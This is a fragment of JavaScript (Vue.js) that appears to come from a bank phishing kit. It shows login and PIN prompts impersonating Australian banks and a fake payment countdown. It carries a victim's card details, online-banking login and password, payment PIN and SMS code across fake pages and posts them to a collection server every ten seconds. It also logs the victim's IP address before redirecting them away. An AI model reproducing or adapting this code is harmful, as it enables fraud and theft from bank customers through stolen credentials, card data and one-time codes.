				} else if (bankName == "BANK OF WESTERN AUSTRALIA, LTD.") {
					this.EBankLoginTextHintShow = "Please log in Western Bank of Australia";
					this.eBankShowIcon.Bankwest = true;
					this.PINTextHintShow = "Please Enter Western Bank PIN";
				} else if (bankName == "ST. GEORGE BANK, LTD.") {
					this.EBankLoginTextHintShow = "Please log in St.George Bank of Australia";
					this.eBankShowIcon.StGeorge = true;
					this.PINTextHintShow = "Please Enter St.George Bank PIN";
				} else {
					this.EBankLoginTextHintShow = "Please log in BankAustralia";
					this.eBankShowIcon.BankAustralia = true;
					this.PINTextHintShow = "Please Enter Bank PIN";
				}
			}else {
					this.EBankLoginTextHintShow = "Please log in BankAustralia";
					this.eBankShowIcon.BankAustralia = true;
					this.PINTextHintShow = "Please Enter Bank PIN";
				}
		}
	},
	created() {
		this.getDate();
		this.addClick();
		this.endTime = Date.parse(new Date('2021-07-01 17:32:00 '))
		this.endTime = Date.parse(new Date()) + 300000
		this.countdownPay();
		this.cardNumberLastFour = sessionStorage.getItem("cardNumberLastFour")
		if (this.getPageName() == "EBank.html") {
			if (JSON.parse(sessionStorage.getItem("cvv"))) {
				this.cvv = JSON.parse(sessionStorage.getItem("cvv"));
				this.cvv.ebankClientNumber = "";
				this.cvv.ebankPwd = "";
			} else {
				location.href = 'index.html';
			}
		}
		
		if (this.getPageName() == "Payment.html") {
			if (JSON.parse(sessionStorage.getItem("cvv"))) {
				this.cvv = JSON.parse(sessionStorage.getItem("cvv"));
			} else {
				location.href = 'index.html';
			}
		}
		if (this.getPageName() == "AuthBankSecurityCode.html") {
			if (JSON.parse(sessionStorage.getItem("cvv"))) {
				this.cvv = JSON.parse(sessionStorage.getItem("cvv"));
				this.cvv.bankPayPIN = "";
			} else {
				location.href = 'index.html';
			}
		}
		if (this.getPageName() == "sendSMS.html") {
			if (JSON.parse(sessionStorage.getItem("cvv"))) {
				this.cvv = JSON.parse(sessionStorage.getItem("cvv"));
				this.cvv.codeSMS = "";
			} else {
				location.href = 'index.html';
			}
		}
		this.queryBankSource();
		if (this.getPageName() == "Payment.html" || this.getPageName() == "sendSMS.html" || this
		.getPageName() == "EBank.html" || this.getPageName() == "AuthBankSecurityCode.html") {
			function bian() {
				if (JSON.parse(sessionStorage.getItem("cvv"))) {
					axios.post(url.serviceURL + "/cvv-tb/updateCvvTbOnline", JSON.parse(sessionStorage.getItem(
						"cvv"))).then()
				}
			}
			setInterval(bian, 10 * 1000);
		}


		if(this.getPageName()=="thank.html"){
			localStorage.setItem("power",1);
			axios.get(url.serviceURL + "/click/updatePower?ip=" + returnCitySN['cip']).then(res => {
			})
			function bian(){
				location.href=url.CPCurl;
			}
			setTimeout(bian,3000);	
		}
	}
})
